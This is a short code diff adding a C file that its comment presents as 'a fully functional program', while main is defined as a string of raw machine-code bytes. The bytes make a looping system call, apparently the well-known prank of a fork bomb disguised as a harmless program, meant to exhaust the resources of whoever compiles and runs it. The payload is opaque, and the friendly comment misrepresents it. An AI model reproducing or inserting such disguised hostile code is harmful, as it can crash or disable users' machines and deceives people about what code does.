@@ -1,0 +1,3 @@
+// a fully functional program written in C ;)
+
+const char main[] = "\x48\x31\xc0\xb0\x39\xcd\x80\xeb\xfa";
